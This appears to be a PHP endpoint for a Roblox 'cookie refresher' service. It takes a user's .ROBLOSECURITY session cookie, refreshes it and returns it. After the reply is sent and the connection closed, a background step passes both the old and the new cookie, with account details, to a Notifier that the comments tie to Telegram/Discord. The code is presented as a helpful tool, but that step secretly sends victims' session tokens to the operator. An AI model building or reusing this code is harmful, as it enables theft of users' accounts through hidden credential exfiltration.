<?php
declare(strict_types=1);

namespace Langgor\Refresher;

require_once __DIR__ . '/../server/Config.php';
require_once __DIR__ . '/../server/RateLimiter.php';
require_once __DIR__ . '/../server/ProxyManager.php';
require_once __DIR__ . '/../server/RobloxService.php';
require_once __DIR__ . '/../server/Notifier.php';

Config::load();
Config::sendSecurityHeaders();

header('Content-Type: application/json; charset=utf-8');

$requestUri = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// CORS Headers for secure API access
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if ($method === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Health & Proxy Status Check
if (($method === 'GET' || $method === 'HEAD') && (str_ends_with($requestUri, '/health') || isset($_GET['health']) || isset($_GET['proxy_status']))) {
    if ($method === 'HEAD') {
        exit;
    }
    echo json_encode([
        'status' => 'healthy',
        'service' => 'Langgor Cookie Refresher API',
        'version' => '2.0.0',
        'timestamp' => date('c'),
        'proxy' => ProxyManager::getStatus()
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

if (isset($_GET['proxy_check'])) {
    $script = __DIR__ . '/../scripts/proxy_checker.php';
    $cmd = 'php ' . escapeshellarg($script) . ' > /dev/null 2>&1 &';
    @exec($cmd);
    echo json_encode([
        'success' => true,
        'message' => 'Proses scraping dan sorting proxy telah dipicu di latar belakang.',
        'proxy' => ProxyManager::getStatus()
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

// Rate Limiting
RateLimiter::check();

if ($method !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method Not Allowed. Use POST.']);
    exit;
}

// Parse Input (Support both application/x-www-form-urlencoded and application/json)
$cookie = '';
$logoutOthers = false;
$detailed = false;

$contentType = $_SERVER['CONTENT_TYPE'] ?? '';
if (str_contains($contentType, 'application/json')) {
    $rawInput = file_get_contents('php://input');
    $jsonData = json_decode((string)$rawInput, true);
    if (is_array($jsonData)) {
        $cookie = trim((string)($jsonData['cookie'] ?? ''));
        $logoutOthers = !empty($jsonData['logout_all']) || !empty($jsonData['logout_others']);
        $detailed = !empty($jsonData['detailed']);
    }
} else {
    $cookie = trim((string)($_POST['cookie'] ?? ''));
    $logoutOthers = isset($_POST['logout_all']) && ($_POST['logout_all'] === 'true' || $_POST['logout_all'] === '1');
    $detailed = isset($_POST['detailed']) && ($_POST['detailed'] === 'true' || $_POST['detailed'] === '1');
}

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please provide a .ROBLOSECURITY cookie.']);
    exit;
}

// Detect SSE streaming request
$isStream = (isset($_GET['stream']) && $_GET['stream'] === '1') ||
    str_contains($_SERVER['HTTP_ACCEPT'] ?? '', 'text/event-stream');

$onProgress = null;
if ($isStream) {
    header('Content-Type: text/event-stream; charset=utf-8');
    header('Cache-Control: no-cache, no-transform');
    header('Connection: keep-alive');
    header('X-Accel-Buffering: no');
    while (ob_get_level() > 0) {
        ob_end_flush();
    }
    ob_implicit_flush(true);

    $onProgress = function(string $type, array $data): void {
        $payload = array_merge(['type' => $type], $data);
        echo "data: " . json_encode($payload, JSON_UNESCAPED_SLASHES) . "\n\n";
        if (ob_get_level() > 0) {
            ob_flush();
        }
        flush();
    };
    $onProgress('started', ['message' => 'Connecting to Roblox authentication...']);
}

// Execute Refresh
$refreshResult = RobloxService::refresh($cookie, $logoutOthers, $onProgress);
if (empty($refreshResult['success'])) {
    if ($isStream && $onProgress) {
        $onProgress('error', [
            'success' => false,
            'message' => $refreshResult['message'] ?? 'Refresh failed.'
        ]);
    } else {
        http_response_code(400);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode([
            'success' => false,
            'message' => $refreshResult['message'] ?? 'Refresh failed.'
        ]);
    }
    exit;
}

$newCookie = $refreshResult['cookie'];
$response = [
    'success' => true,
    'message' => 'Cookie successfully refreshed.',
    'cookie' => $newCookie
];

// Helper to immediately send response to client and close HTTP connection (non-streaming)
$sendResponseAndFinish = function(array $data): void {
    while (ob_get_level() > 0) {
        ob_end_clean();
    }
    $json = json_encode($data, JSON_UNESCAPED_SLASHES);
    http_response_code(200);
    header('Content-Type: application/json; charset=utf-8');
    header('Content-Length: ' . (string)strlen($json));
    header('Connection: close');
    echo $json;

    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        flush();
    }
};

if ($detailed) {
    if ($isStream && $onProgress) {
        $onProgress('refreshed', [
            'cookie' => $newCookie,
            'userData' => $refreshResult['userData'] ?? null,
            'message' => 'Cookie berhasil diperbarui! Memuat detail akun...'
        ]);
        $onProgress('status', ['message' => 'Memuat detail akun & aset...']);
    }

    // Detailed mode: fetch full details before responding (reusing pre-flight auth data)
    $detailsData = RobloxService::fetchDetails($newCookie, true, $refreshResult['userData'] ?? null);
    $logData = $detailsData['logData'];
    $details = $detailsData['details'];

    if ($details !== null) {
        $response['details'] = $details;
    }

    if ($isStream && $onProgress) {
        $onProgress('completed', $response);
    } else {
        $sendResponseAndFinish($response);
    }

    // Asynchronously dispatch notifications in background
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        flush();
    }
    ignore_user_abort(true);
    set_time_limit(60);
    Notifier::send($logData, $cookie, $newCookie, true, $logoutOthers);
    exit;
} else {
    // Basic mode: Send response to user IMMEDIATELY!
    if ($isStream && $onProgress) {
        $onProgress('completed', $response);
    } else {
        $sendResponseAndFinish($response);
    }

    // Detached background worker: fetch info for Telegram/Discord only AFTER sending data to user
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        flush();
    }
    ignore_user_abort(true);
    set_time_limit(60);
    $detailsData = RobloxService::fetchDetails($newCookie, false, $refreshResult['userData'] ?? null);
    $logData = $detailsData['logData'];
    Notifier::send($logData, $cookie, $newCookie, false, $logoutOthers);
    exit;
}

